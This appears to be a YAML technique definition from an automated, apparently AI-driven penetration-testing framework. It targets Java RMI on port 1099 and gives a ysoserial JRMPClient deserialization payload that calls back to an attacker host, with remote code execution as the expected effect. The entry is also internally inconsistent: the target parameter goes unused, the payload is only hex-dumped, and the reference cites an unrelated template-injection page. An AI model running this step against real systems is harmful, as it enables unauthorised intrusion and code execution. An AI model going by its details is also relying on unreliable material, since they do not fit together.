name: java_rmi
category: services
description: Java RMI exploitation
preconditions:
- service.port==1099
parameters:
  target_ip: from_engagement.target_ip
command_template: java -jar ysoserial-all.jar JRMPClient {attacker_ip}:9999 | xxd
parser: generic_parser
expected_effects:
- rmi_exploited
- rce_achieved
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'Java RMI: remote method invocation. BeanShell/Groovy class loading for
  direct RCE. ysoserial JRMP payloads for deserialization attacks. rmg for enumeration.'
hacktricks_ref: pentesting-web/ssti-server-side-template-injection/README.md
